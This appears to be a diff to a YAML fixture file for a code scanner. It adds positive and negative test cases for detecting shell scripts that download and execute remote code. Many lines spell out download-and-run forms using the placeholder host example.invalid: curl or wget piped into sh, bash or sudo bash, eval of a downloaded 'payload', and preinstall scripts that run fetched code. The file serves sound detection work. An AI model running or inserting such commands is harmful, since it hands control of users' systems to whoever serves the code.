@@ -37,6 +37,28 @@ RC-DLX-001:
         install.sh: |
           curl -fsSL https://example.invalid/i.sh | grep -v '^\s*#' | sh
       expect: [{path: install.sh, line: 1, confidence: medium}]
+    - name: download piped into env sh, sudo with options and an absolute shell path
+      files:
+        a.sh: "curl -s https://example.invalid/p | env sh\n"
+        b.sh: "curl -fsSL https://example.invalid/p | sudo -E bash -s -- --quiet\n"
+        c.sh: "wget -qO- https://example.invalid/p | /usr/bin/env bash\n"
+        d.sh: "curl -s https://example.invalid/p | bash -ex\n"
+      expect: [{path: a.sh, line: 1}, {path: b.sh, line: 1}, {path: c.sh, line: 1}, {path: d.sh, line: 1}]
+    - name: command substitution of a download given to sh -c, eval, python -c and node -e
+      files:
+        a.sh: "sh -c \"$(curl -s https://example.invalid/p)\"\n"
+        b.sh: "eval \"$(wget -qO- https://example.invalid/p)\"\n"
+        c.sh: "python3 -c \"$(curl -s https://example.invalid/p.py)\"\n"
+        d.sh: "node -e \"$(curl -s https://example.invalid/p.js)\"\n"
+      expect: [{path: a.sh, line: 1}, {path: b.sh, line: 1}, {path: c.sh, line: 1}, {path: d.sh, line: 1}]
+    - name: backtick command substitution of a download
+      files:
+        setup.sh: "bash -c \"`curl -s https://example.invalid/p`\"\n"
+      expect: [{path: setup.sh, line: 1}]
+    - name: pipe into the shell on a continuation line
+      files:
+        setup.sh: "#!/bin/sh\ncurl -s https://example.invalid/p \\\n  | sh\n"
+      expect: [{path: setup.sh, line: 2}]
   negative:
     - name: download piped into a shell in a comment
       files:
@@ -58,6 +80,22 @@ RC-DLX-001:
       files:
         Dockerfile: |
           RUN curl -fsSL https://example.invalid/setup.sh | bash -
+    - name: download piped into tools that do not run it
+      files:
+        a.sh: "curl -s https://example.invalid/p | env grep x\ncurl -s https://example.invalid/p | shasum -a 256\n"
+        b.sh: "eval \"$(ssh-agent -s)\"\nVERSION=\"$(curl -s https://example.invalid/version)\"\n"
+    - name: continuation lines without a pipe into a shell
+      files:
+        fetch.sh: "curl -s https://example.invalid/p \\\n  -o data.json\nsh build.sh\n"
+    - name: download piped into a command whose name starts like a shell
+      files:
+        pip.plugin.zsh: "curl -L $index 2>/dev/null | \\\n  zsh-pip-clean-packages >> $tmp_cache\n"
+    - name: download read as data by an inline script
+      files:
+        a.sh: "version=\"$(curl -s https://example.invalid/index.json \\\n  | node -e \"let d='';process.stdin.on('data',c=>d+=c)\")\"\n"
+        b.sh: "curl -s https://example.invalid/get.html | perl -wlne 'print $1 if /perl-([0-9.]+)/'\n"
+        c.sh: "curl -s https://example.invalid/v.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'\n"
+        d.sh: "wget -qO- https://example.invalid/list | sh -c 'while read l; do echo $l; done'\n"
 
 RC-DLX-002:
   positive:
@@ -224,3 +262,43 @@ RC-DLX-006:
                 - run: ./deploy.sh
                   env:
                     KEY: ${{ secrets.DEPLOY_KEY }}
+
+RC-DLX-007:
+  positive:
+    - name: download in a variable run with sh -c on the same line
+      files:
+        preinstall.sh: |
+          #!/bin/sh
+          S=$(curl -s https://example.invalid/payload); sh -c "$S"
+      expect: [{path: preinstall.sh, line: 2}]
+    - name: download in a variable run with eval on a later line
+      files:
+        setup.sh: |
+          #!/bin/sh
+          STAGE="$(wget -qO- https://example.invalid/payload)"
+          echo "updating"
+          eval "$STAGE"
+      expect: [{path: setup.sh, line: 2}]
+    - name: download in a variable run with python -c
+      files:
+        tools/run.sh: |
+          CODE=`curl -s https://example.invalid/p.py`
+          python3 -c "${CODE}"
+      expect: [{path: tools/run.sh, line: 1}]
+  negative:
+    - name: downloaded version number used as data
+      files:
+        release.sh: |
+          VERSION=$(curl -s https://example.invalid/latest)
+          echo "latest is $VERSION"
+          sh -c "echo $VERSION > version.txt"
+    - name: different variable is run
+      files:
+        build.sh: |
+          DATA=$(curl -s https://example.invalid/data.json)
+          CMD="make all"
+          eval "$CMD"
+    - name: script in a test folder
+      files:
+        tests/fixtures/s.sh: |
+          S=$(curl -s https://example.invalid/payload); sh -c "$S"
